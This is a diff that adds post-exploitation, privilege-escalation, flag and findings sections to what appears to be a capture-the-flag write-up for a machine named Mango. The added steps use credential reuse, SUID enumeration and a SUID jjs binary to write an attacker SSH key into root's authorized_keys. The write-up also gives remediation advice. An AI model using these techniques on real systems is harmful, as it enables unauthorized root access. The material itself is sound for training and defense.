@@ -8,7 +8,7 @@
 
 ## 0. Lesson Learned
 
-
+You can ask a NoSQL database “does the username or password start with this?” and use the response to brute force credentials one letter at a time.
 
 ---
 
@@ -115,21 +115,156 @@ Resulting in successful authentication as user `mango`.
 
 ## 7. Post-Exploitation
 
+Privileges were enumerated:
+
+```
+sudo -l
+```
+
+No sudo privileges were available for user `mango`.
+
+User was pivoted to `admin`:
+
+```
+su admin -
+```
+
+Credential reuse allowed switching to user `admin`.
+
+Investigating SSH Configuration files explained inability to SSH as admin:
+
+```
+cat /etc/ssh/sshd_config
+```
+
+User `admin` is not allowed SSH access, explaining login restriction:
+
+```
+AllowUsers mango root
+```
+
 ---
 
 ## 8. Privilege Escalation
+
+SUID binaries wer enumerated:
+
+```
+find / -user root -perm -4000 2>/dev/null -ls
+```
+
+The `jjs` binary is SUID and runs as root, making it a privilege escalation vector.
+
+SSH key pair was generated on the attacker machine:
+
+```
+ssh-keygen -t rsa
+```
+
+jjs Was exploited for File Write
+
+```
+jjs
+
+var FileWriter = Java.type("java.io.FileWriter");
+
+var fw=new FileWriter("/root/.ssh/authorized_keys");
+
+fw.write("ssh-rsa AAAA... root@kali");
+
+fw.close();
+```
+
+The SUID binary allowed writing to `/root/.ssh/authorized_keys`, granting root SSH access.
+
+SSH login with id_rsa:
+
+```
+ssh -i /root/.ssh/id_rsa root@10.129.229.185
+```
+
+Full root access obtained.
 
 ---
 
 ## 9. Proof of Compromise
 
+**User Flag**: *REDACTED*
+
+```
+cat /home/admin/user.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+cat /root/root.txt
+```
+
+This confirms full system compromise.
+
 ---
 
 ## 10. Findings & Recommendations
 
+### **Finding:** NoSQL Injection in Authentication
+
+**Severity:** Critical
+
+**Description:**
+The application login functionality was vulnerable to NoSQL injection, allowing attackers to manipulate backend queries using MongoDB operators such as `$regex` and `$ne`.
+
+**Impact:**
+Attackers could bypass authentication mechanisms and extract valid user credentials.
+
+**Recommendation:**
+Sanitize and validate all user input, implement strict query validation, use parameterized queries, and avoid directly passing user-controlled input into database queries.
+
+### **Finding:** Credential Exposure via Application Logic
+
+**Severity:** High
+
+**Description:**
+The application returned differential responses during authentication attempts, allowing attackers to brute force credentials.
+
+**Impact:**
+Attackers could enumerate valid usernames and passwords, leading to unauthorized access.
+
+**Recommendation:**
+Implement account lockout policies, enforce rate limiting, and use consistent error messages for authentication failures.
+
+### **Finding:** Insecure SUID Binary Allowing Arbitrary File Write
+
+**Severity:** Critical
+
+**Description:**
+A binary (e.g., `jjs`) was configured with SUID permissions and allowed arbitrary file write operations with elevated privileges.
+
+**Impact:**
+Attackers could modify sensitive system files and escalate privileges to root.
+
+**Recommendation:**
+Remove SUID permissions from unnecessary binaries, restrict execution of interpreters with elevated privileges, and audit SUID binaries regularly.
+
+### **Finding:** Weak Access Control in SSH Configuration
+
+**Severity:** Medium
+
+**Description:**
+SSH configuration allowed insufficient access restrictions, enabling unintended lateral movement between user accounts.
+
+**Impact:**
+Attackers could reuse credentials to pivot between accounts and escalate privileges.
+
+**Recommendation:**
+Enforce strict SSH access controls, restrict user login permissions, and prevent credential reuse across accounts.
+
 ---
 
 ## 11. Appendix
+
+NoSQL Injections -
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
 
 Python Script to Brute Force Usernames and Passwords in NoSQL (`brute_user.py`):
 
